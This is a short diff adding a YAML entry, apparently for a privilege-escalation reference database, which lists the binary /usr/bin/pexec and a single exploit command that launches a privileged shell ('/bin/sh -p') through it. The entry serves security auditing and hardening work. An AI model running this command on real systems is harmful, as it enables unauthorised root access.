@@ -1,0 +1,4 @@
+name: pexec
+binary_path: /usr/bin/pexec
+exploit_cmds:
+- /usr/bin/pexec /bin/sh -p
